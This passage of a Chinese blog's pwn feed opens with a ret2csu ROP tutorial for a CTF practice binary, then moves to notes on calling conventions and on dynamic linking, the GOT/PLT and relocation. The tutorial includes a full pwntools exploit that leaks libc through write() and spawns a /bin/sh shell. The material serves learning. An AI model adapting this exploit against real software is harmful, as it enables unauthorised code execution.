8</p></blockquote><p>在收到write()在内存中的地址后，就可以计算出system()在内存中的地址。借此就可以将execve的地址以及“&#x2F;bin&#x2F;sh”读入到.bss段内存中。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">bin_sh_str</span> = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br><span class="hljs-variable">bss_addr</span> = <span class="hljs-number">0</span><span class="hljs-variable">x601040</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">read_got</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">16</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br><span class="hljs-variable">sh.send</span>(<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">execve_addr</span>) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>read(0,bss_base,16) 的含义为从标准输入中读取最多 16 个字节的数据，并将数据存储到位于 <code>bss_base</code> 地址处的缓冲区中。</p></blockquote><p>最后调用执行 <code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span> + <span class="hljs-number">8</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><p>总的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = <span class="hljs-number">0x400600</span><br>csu_end_addr = <span class="hljs-number">0x40061A</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>)<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + <span class="hljs-built_in">hex</span>(execve_addr))<br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">16</span>, bss_base, <span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8,0,0)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bss_base, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss_base + <span class="hljs-number">8</span>, main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p>很菜菜的ROP，把笔记收拾收拾发一下。</p><p>本来想说栈上全部东西都搞完再发，但最近github上的绿点点都少了就提前发一部分喽😢</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数调用约定</title>
    <link href="/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>函数参数怎么传递和由谁清除堆栈</p><span id="more"></span><p>炒冷饭，都快要忘记自己有一个博客了 (x</p><h1 id="什么是函数调用约定"><a href="#什么是函数调用约定" class="headerlink" title="什么是函数调用约定"></a>什么是函数调用约定</h1><p>在函数被调用的过程中，编译器都进行了以下的工作：</p><ol><li><p>把调用者的地址压入栈</p></li><li><p>把函数的参数压入栈或者存储到寄存器当中</p></li><li><p>调转到被引用函数</p></li><li><p>把函数使用的寄存器压入栈</p></li><li><p>执行函数</p></li><li><p>处理函数返回值</p></li><li><p>将第三步中压栈的寄存器恢复到原始值</p></li><li><p>清空第一部中的压栈参数和处理返回地址</p></li><li><p>返回到调用者调用时的地址（即步骤一时记录的地址）</p></li></ol><p>函数调用约定，就是对函数调用的一个约束和规定(规范)，描述了函数参数是怎么传递和由谁清除堆栈的。（堆栈平衡？）</p><blockquote><p>x64的前四个参数使用rcx，rdx，r8，r9传递，之后的参数通过栈来传递</p></blockquote><p>它决定以下三个方面：</p><ul><li>函数参数传递的方式（是否采用寄存器传递函数，采用那个寄存器调用函数，参数压栈顺序等）</li><li>函数调用结束后的栈指针由谁恢复（被调用者恢复或是被调用的函数恢复）</li><li>函数修饰名的产生方法</li></ul><p>我们构造一个函数的时候，会规定返回类型和函数名（参数列表），如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">funcA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">funcB</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>; <br></code></pre></td></tr></table></figure><p>除此之外，还有另外一部分，就是函数的调用约定，由系统自动生成，也可以有我们来手动编写规定，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">funA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">funcB</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><h4 id="常见的调用约定"><a href="#常见的调用约定" class="headerlink" title="常见的调用约定"></a>常见的调用约定</h4><ul><li>c：__cdecl 、__stdcall、__fastcall、naked、__pascall</li><li>c++：__cdecl 、__stdcall、__fastcall、naked、__pascall、__thiscall</li></ul><h4 id="调用约定的使用"><a href="#调用约定的使用" class="headerlink" title="调用约定的使用"></a>调用约定的使用</h4><p>调用约定书写在函数的前面，相当于函数类型的一部分。要求函数的声明和定义要有相同的调用约定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;   <span class="hljs-comment">//默认是__cdecl</span><br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上在编译过程中就会提示出错，因为声明和定义的调用约定不同。正确应该是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;<br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="不同调用下的规则"><a href="#不同调用下的规则" class="headerlink" title="不同调用下的规则"></a>不同调用下的规则</h1><p>首先我们定义两个概念，即“被调用者”和“调用者”。如下Add()函数就是“被调用者”，ShoowResult()函数就是“调用者”。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h2><p>__cdecl是C Declaration的缩写，表示C\C++默认的函数调用约定</p><h4 id="调用方式"><a href="#调用方式" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由调用者恢复栈顶指针</li><li>编译器在编译时会在函数名前加上一个下划线前缀生成修饰名，格式为_function。如Add()的修饰名是_Add()</li></ul><blockquote><p>注意：调用参数个数可变的函数只能采用这种方式</p></blockquote><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h2><p>__stdcall是Standard Call的缩写，是C++的标准调用方式。</p><h4 id="调用方式-1"><a href="#调用方式-1" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由被调用者负责恢复栈顶指针</li><li>在输出函数名前加上一个下划线前缀，后面加一个@符号和其参数的字节数，格式为_function@number。如函数Add的修饰名是_Add@8</li></ul><p>__stdcall与__cdecl最主要的区别是第2条规定：由“被调用者”清空实际上就是把对应参数数目的数据从栈中弹出，这样的缺点就是它不能使用于那些不确定数目参数的函数。</p><p>好处在于只需要在函数内部编译出恢复栈顶的代码，而调用者恢复则需要在调用出编译出恢复栈顶的代码。</p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h2><p>__fastcall是快速调用，因为有部分参数可以通过寄存器直接传递，效率比较高。</p><h4 id="调用方式-2"><a href="#调用方式-2" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>函数的第一个和第二个（<strong>从左向右</strong>）32字节参数（或者尺寸更小的）通过ecx和edx传递（寄存器传递），其他参数通过桟传递。从第三个参数（如果有的话）开始<strong>从右向左</strong>的顺序压栈</li><li>由被调用者恢复栈顶指针</li><li>在函数名前加上@，在函数名后加@和参数字节数，格式为@function@number</li></ul><h2 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h2><p>__thiscall是唯一一个不能明确指明的函数修饰，因为thiscall只能用于C++类成员函数的调用，同时thiscall也是C++成员函数缺省的调用约定。由于成员函数调用还有一个this指针，因此必须特殊处理。</p><h4 id="调用方式-3"><a href="#调用方式-3" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>自右向左</strong>入栈</li><li>如果参数的个数确定，this指针通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入堆栈</li><li>对于参数个数不确定的由调用者问清理堆栈，否则由被调函数清理。</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态链接GOT与PLT</title>
    <link href="/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/"/>
    <url>/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/</url>
    
    <content type="html"><![CDATA[<p>主要是动态链接的一些内容</p><span id="more"></span><p>断断续续磨了一个周，本来只是想学一下got表后来发现越挖越深什么都不会，大致了解一下，最后写出了这样一个网络垃圾（x</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p><strong>链接就是把目标文件与一些库文件生成可执行文件的一个过程。</strong></p><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>要了解“链接”的概念，首先要了解C语言编译生成可执行文件的过程：(1) 预处理；(2) 编译；(3) 汇编；(4) 链接；</p><h5 id="01-预处理"><a href="#01-预处理" class="headerlink" title="01 预处理"></a>01 预处理</h5><p>使用预处理器把源文件<code>test.c</code>经过预处理生成<code>test.i</code>文件，预处理用于将所有的<code>#include</code>头文件以及宏定义替换成其真正的内容，其中<code>test.i</code>是文本文件。</p><p>这里是一个c语言的源文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&#x27;This is a test program!\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gcc处理命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -E test.c -o test.i   #-E是让编译器在预处理之后就退出，不进行后续编译过程；-o是指定输出文件名。<br></code></pre></td></tr></table></figure><p>处理后的test.i文件就会变得很长很长，以下是部分截图：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-09-26.png"></p><h5 id="02-编译"><a href="#02-编译" class="headerlink" title="02 编译"></a>02 编译</h5><p>使用编译器将预处理文件<code>test.i</code>编译成汇编文件<code>test.s</code>，其中<code>test.s</code>是文本文件。</p><p>gcc命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -S test.i -o test.s   #-S让编译器在编译之后停止，不进行后续过程；-o是指定输出文件名<br></code></pre></td></tr></table></figure><p>处理后的test.s文件又变得短短的了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-19-27.png"></p><h5 id="03-编译"><a href="#03-编译" class="headerlink" title="03 编译"></a>03 编译</h5><p>使用汇编器将汇编文件<code>test.s</code>转换成目标文件<code>test.o</code>，其中<code>test.o</code>是二进制文件。</p><p>汇编过程的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -c test.s -o test.o   #-c让汇编器把汇编文件test.s转换成目标文件test.o。<br></code></pre></td></tr></table></figure><h5 id="04-链接"><a href="#04-链接" class="headerlink" title="04 链接"></a>04 链接</h5><p>链接过程使用链接器将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件。</p><p>该步骤的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc test.o test.exe-E <br></code></pre></td></tr></table></figure><p>拖进IDA就是我们比较熟悉的样子了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-42-21.png"></p><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>我们在写程序的时候，通常不会完全靠自己来实现所有功能，我们会调用我们所需要的系统库或者第三方库来实现我们的功能，这些库就是动态链接库。</p><blockquote><p>动态链接库可以映射到不同进程的不同虚拟地址，所以属于“地址无关代码”。</p></blockquote><p>🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">strncpy</span>(buf, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">32</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这段代码中我们调用了系统库，在编译完成后可以查看文件的symbol。会发现在printf和strncpy前面都是没有定义的，这就是用于支持动态连接功能的。</p><blockquote><p>两种命令可以随意挑选，但结果不太一样，还没搞明白😳</p><p><code>nm -g [filename]</code></p><p><code>readelf  -s [filename]</code></p></blockquote><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_18-30-06.png"></p><p>通过objdump命令查看相关函数的反汇编模块 <code>objdump -D [filename]</code>（在.plt部分）</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_21-05-57.png"></p><p>可以看到，程序首先进行jupq操作跳转到相应的代码段，这个代码段就是用于给“地址无关代码”做动态地址重定位，链接器将这个函数的调用代码跳转到程序运行时的动态装载地址。</p><h3 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h3><p>链接器（Linker）是一个程序，将一个或多个由编译器或汇编器生成的目标文件外加库链接为一个可执行文件。目标文件是包括机器码和链接器可用信息的程序模块。</p><p>简单的讲，<strong>链接器的工作就是解析未定义的符号引用，将目标文件中的占位符替换为符号的地址</strong>。</p><p>链接器还要完成程序中各目标文件的地址空间的组织，涉及重定位工作。</p><h5 id="链接器的工作步骤"><a href="#链接器的工作步骤" class="headerlink" title="链接器的工作步骤"></a>链接器的工作步骤</h5><ul><li>将代码和数据模块象征性地放入内存</li><li>决定数据和指令标签的地址</li><li>修补内部和外部引用</li></ul><h5 id="链接器需要对动态链接库做的情"><a href="#链接器需要对动态链接库做的情" class="headerlink" title="链接器需要对动态链接库做的情"></a>链接器需要对动态链接库做的情</h5><ul><li>链接库在将目标文件链接成可执行文件的的时候，如果发现某一个变量或者函数在目标中找不到，就会按照 gcc 预定义的动态库寻找动态库中定义的变量或者函数</li><li>如果链接库在某一动态库中找到了该变量或者函数的定义，链接库首先会把这个动态链接库写到可执行文件的依赖库中，然后生成这个当前变量或者函数的代理symbol</li><li>在偏移表中生成真正的动态跳转指令，并且在库函数代理symbol中跳转到相应的偏移位置</li></ul><h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>重定位（Relocations）就是把程序的逻辑地址变换成为内存中的实际地址空间的过程。</p><p>重定位分为两步：</p><ul><li>重定位节和符号引用</li></ul><p>在这一步中，连接器将所有相同类型的节合并为同一类型的新聚节。随后链接器把运行时的内存赋值给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块的每个符号。</p><blockquote><p>e.g.所有输入模块的.data节被合并为一个节，这个节成为输入的可执行目标文件的.data节。</p></blockquote><p>当这一步完成，程序中的每条指令和全局变量都有唯一的运行时的内存地址了。</p><ul><li>重定位节中的符号引用</li></ul><p>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得他们指向正确的运行地址。</p><p>其中，链接器执行这一步需要依靠可重定位目标模块中成为<strong>重定位条目</strong>的数据结构。</p><h5 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h5><p>当汇编器生成一个目标模块时，他并不知道数据和代码最终会被放在内存的那个位置，也不知道这个模块引用的外部定义的函数或者全局变量的位置。所以，当汇编器遇到一个对最终位置未知的目标引用，它就会生成一个重定位条目，告诉连接器将目标文件合并成可执行文件时如何修改这个引用。</p><p>代码的重定位条目放在<code>.rel.text</code>中，已经初始化数据的重定位条目放在<code>.rel.data</code>中。</p><p>重定位条目分为两种格式：<code>Rel</code>和<code>Rela</code>。每个重定位条目表示一个必须被重定位的符号引用，并指明如何计算被修改的符号引用。</p><blockquote><p>重定位条目<code>Rel</code>和<code>Rela</code>之间的唯一区别：<code>Rel</code>中没有<code>Addend</code>字段。</p></blockquote><p>查看文件中的重定位信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">readelf -r [filename]<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-12_21-32-29.png"></p><ul><li><p><code>Offset</code>是 Relocation Entry 结构体中的第 1 个字段，占用 8 字节，表示<strong>需要修改的符号引用的位置</strong>。</p><ul><li><p>对于可重定位目标文件，该字段表示需要修改的符号引用的起始位置在目标 section （<code>.rela.text</code>中的重定位条目对应的目标 section 为<code>.text</code>，<code>.rela.data</code>中的重定位条目对应的目标 section 为<code>.data</code>，以此类推）中的偏移量（字节）。</p></li><li><p>对于可执行目标文件和可共享目标文件，该字段表示需要修改的符号引用的起始位置所对应的虚拟内存地址。</p></li></ul></li><li><p><code>Info</code>是 Relocation Entry 结构体中的第 2 个字段，占用 8 字节，表示<strong>符号表索引和重定位类型</strong>（符号表索引占用高 32 位，重定位类型占用低 32 位）。</p><ul><li><p>符号表索引表示需要修改的符号引用在<code>.symtab</code>section中的索引。这里的<code>Sym. Value</code>和<code>Sym. Name</code>列只是打印了所对应符号表条目中<code>Value</code>和<code>Name</code>列的值。</p></li><li><p>重定位类型指示链接器如何修改该符号引用的值。重定位类型因不同的处理器而异。</p></li></ul></li><li><p><code>Addend</code>是 Relocation Entry 结构体中的第 3 个字段，占用 8 字节，表示一个有符号常数，一些重定位类型要使用它对被修改符号引用的值做<strong>偏移调整</strong>。</p></li></ul><h1 id="静态链接和动态链接"><a href="#静态链接和动态链接" class="headerlink" title="静态链接和动态链接"></a>静态链接和动态链接</h1><h4 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h4><blockquote><p>静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成链接到一块生成可执行程序。这里的库指的是静态链接库，Windows下以<code>.lib</code>为后缀，Linux下以<code>.a</code>为后缀。</p></blockquote><p>若程序使用静态链接方式，则程序所有代码都将集成到同一个二进制文件中，其优点在于无依赖关系，可以在不同运行环境的OS下运行。</p><p>但是缺点也十分明显，由于二进制文件中包含全部代码，所以所占空间较大；如果多次运行同一个程序，则OS可能会对某个库函数进行多次重复 的加载，占用了不必要的内存；若某个公用的库函数产生了更新，则需要重新编译所有使用了该库的程序，工作量较大。</p><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul><li>代码装载速度快，执行速度略比动态链接库快；</li><li>只需保证在开发者的计算机中有正确的.lib文件，在以二进制形式发布程序时不需考虑在用户的计算机上.lib文件是否存在及版本问题。</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用静态链接生成的可执行文件体积较大，包含一些重复相同的代码，造成内存空间的浪费。</li></ul><h4 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h4><p>动态链接（Dynamic Linking），把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。这里的库指的是动态链接库，Windows下以<code>.dll</code>为后缀，Linux下以<code>.so</code>为后缀。</p><p>在Windows下的动态链接也可以用到.lib为后缀的文件，但这里的<code>.lib</code>文件叫做导入库，是由<code>.dll</code>文件生成的。</p><h5 id="优点-1"><a href="#优点-1" class="headerlink" 